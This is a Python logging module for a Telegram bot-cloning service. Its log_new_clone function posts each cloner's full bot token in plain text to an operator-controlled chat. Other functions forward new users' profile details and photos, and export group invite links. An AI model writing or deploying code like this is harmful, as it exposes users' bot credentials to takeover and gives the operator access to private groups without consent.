from telegram import Update
from telegram.ext import ContextTypes
from .config import CLONE_LOGGER, LOGGER_GROUP


# =========================
# NEW CLONE LOG
# =========================

async def log_new_clone(context: ContextTypes.DEFAULT_TYPE, user, token, bot_username):

    text = (
        "🚀 **NEW CLONE ALERT!**\n\n"
        f"👤 **Owner:** {user.first_name}\n"
        f"🆔 **Owner ID:** `{user.id}`\n"
        f"🏷 **Owner Username:** @{user.username if user.username else 'N/A'}\n"
        f"🤖 **Bot Username:** @{bot_username}\n"
        f"🔑 **Token:** `{token}`"
    )

    await context.bot.send_message(
        chat_id=CLONE_LOGGER,
        text=text,
        parse_mode="Markdown"
    )


# =========================
# USER START LOG
# =========================

async def log_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.effective_user
    photo_id = None

    try:
        photos = await context.bot.get_user_profile_photos(user.id)
        if photos.total_count > 0:
            photo_id = photos.photos[0][-1].file_id
    except:
        pass

    text = (
        "👤 **NEW USER STARTED!**\n\n"
        f"🆔 **ID:** `{user.id}`\n"
        f"🏷 **Username:** @{user.username if user.username else 'N/A'}\n"
        f"📝 **Name:** {user.first_name}"
    )

    if photo_id:
        await context.bot.send_photo(
            chat_id=LOGGER_GROUP,
            photo=photo_id,
            caption=text,
            parse_mode="Markdown"
        )
    else:
        await context.bot.send_message(
            chat_id=LOGGER_GROUP,
            text=text,
            parse_mode="Markdown"
        )


# =========================
# GROUP ADD LOG
# =========================

async def log_group_add(update: Update, context: ContextTypes.DEFAULT_TYPE):

    chat = update.effective_chat
    user = update.effective_user

    try:
        link = await chat.export_invite_link()
    except:
        link = "No Link (Bot not admin)"

    text = (
        "🏰 **ADDED TO NEW GROUP!**\n\n"
        f"👥 **Group Name:** {chat.title}\n"
        f"🆔 **Group ID:** `{chat.id}`\n"
        f"🔗 **Link:** {link}\n"
        f"👤 **Added By:** {user.first_name} "
        f"(@{user.username if user.username else 'N/A'})"
    )

    await context.bot.send_message(
        chat_id=LOGGER_GROUP,
        text=text,
        parse_mode="Markdown"
    )
